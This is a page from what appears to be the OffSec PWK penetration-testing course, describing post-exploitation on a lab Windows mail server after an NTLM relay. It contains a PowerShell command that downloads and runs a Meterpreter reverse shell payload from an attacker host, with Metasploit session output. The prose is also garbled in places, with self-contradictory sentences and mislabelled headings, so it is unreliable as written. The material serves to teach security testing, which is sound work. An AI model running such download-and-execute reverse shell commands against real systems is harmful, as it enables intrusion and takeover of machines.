# OffSec

Penetration Testing with Kali Linux

Great! We successfully obtained code execution as NT AUTHORITY\SYSTEM by authenticating as a local Administrator on MAILSRV1 by relaying an authentication attempt from the WordPress plugin on INTERNALSRV1.

In the next Learning Unit, we will leverage the interactive shell on MAILSRV1 to obtain privileged access to the domain and its domain controller.

# 24.6 Gaining Access to the Domain Controller

This Learning Unit covers the following client-side attacks

+   * Gather information to prepare client-side attacks
* Leverage fingerprinting to obtain information

In the next Learning Unit, we gained access to MAILSRV1 as NT AUTHORITY\SYSTEM. Based on the information from enumerating the network, we will attempt to obtain Administrator privileges in the Learning Unit and use them to extract the domain controller.

# 24.6.1 Cached Credentials

As planned, we obtained privileged code execution on MAILSRV1. Our next step is to extract the password hash for the user daniela, which has an active session on the system.

> Depending on the objective of the penetration test, we should not skip the local enumeration of the MAILSRV1 system. This could reveal additional vulnerabilities and sensitive information, which we may miss if we directly attempt to extract the NTLM hash for daniela.

If we discover that no AV is running, we should upgrade our shell to Meterpreter. This will not provide us with a more robust shell environment, but aiding in post-exploitation.

Let's download the preferable Meterpreter reverse shell payload **met.exe** to perform post-exploitation.

```
PS C:\system32> cd C:\Users\Administrator
PS C:\Users\Administrator> iwr -uri http://192.168.119.5:8000/met.exe -Outfile met.exe
PS C:\Users\Administrator> .\.met.exe
```

In Metasploit, we should receive a new incoming session.

+   * Sending stage (208774 bytes) to 192.168.50.242
* Meterpreter session 2 opened (192.168.119.5:443 -> 192.168.50.242:50814)

Let's interact with the session and spawn a new PowerShell command line.

PWK - Copyright 2023 OffSec Services Limited. All rights reserved.

858